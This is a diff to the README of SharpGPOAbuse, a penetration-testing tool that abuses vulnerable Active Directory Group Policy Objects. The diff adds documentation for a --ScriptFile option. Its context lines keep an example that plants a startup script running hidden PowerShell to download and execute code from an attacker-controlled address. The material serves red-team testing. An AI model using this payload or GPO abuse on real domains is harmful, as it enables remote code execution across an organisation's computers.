@@ -59,11 +59,16 @@ Options required to add a new user or computer startup script:
         Set the name of the new startup script.
 --ScriptContents
         Set the contents of the new startup script.
+--ScriptFile
+        Set the path to a startup script file (use this OR --ScriptContents).
 --GPOName
         The name of the vulnerable GPO.
 
 Example: 
         SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+
+Example (using --ScriptFile):
+        SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptFile "C:\\Temp\\StartupScript.bat" --GPOName "Vulnerable GPO"
 ```
 
 If you want to run the malicious script only on a specific user or computer controlled by the vulnerable GPO, you can add an if statement within the malicious script:
@@ -113,6 +118,7 @@ SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --
 ## Additional Options 
 | Option               | Description                               |
 | ---------------------|-------------------------------------------|
+| --ScriptFile         | Path to startup script file (for --AddUserScript/--AddComputerScript, use this OR --ScriptContents) |
 | --DomainController   | Set the target domain controller          |
 | --Domain             | Set the target domain                     |
 | --Force              | Overwrite existing files if required      | 
